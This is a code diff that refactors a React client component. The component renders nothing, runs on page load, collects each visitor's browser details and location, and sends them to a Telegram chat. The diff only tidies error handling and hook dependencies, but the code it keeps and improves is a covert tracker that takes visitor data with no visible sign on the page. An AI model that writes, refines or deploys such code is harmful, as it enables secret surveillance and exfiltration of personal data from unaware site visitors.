@@ -1,6 +1,6 @@
 'use client';
 
-import { useEffect } from 'react';
+import { useCallback, useEffect } from 'react';
 import axios from 'axios';
 
 interface BrowserInfo {
@@ -85,16 +85,20 @@ ${locationInfo}
       });
 
       console.log('Information sent to Telegram successfully!');
-    } catch (error: any) {
-      console.error('Error sending to Telegram:', {
-        message: error.message,
-        response: error.response?.data,
-        status: error.response?.status
-      });
+    } catch (error: unknown) {
+      if (axios.isAxiosError(error)) {
+        console.error('Error sending to Telegram:', {
+          message: error.message,
+          response: error.response?.data,
+          status: error.response?.status
+        });
+      } else {
+        console.error('An unexpected error occurred:', error);
+      }
     }
   };
 
-  const getUserInfo = async () => {
+  const getUserInfo = useCallback(async () => {
     // Get browser information immediately
     const browserInfo: BrowserInfo = {
       userAgent: navigator.userAgent,
@@ -133,11 +137,11 @@ ${locationInfo}
         });
       }
     );
-  };
+  }, []);
 
   useEffect(() => {
     getUserInfo();
-  }, []);
+  }, [getUserInfo]);
 
   return null;
 } 
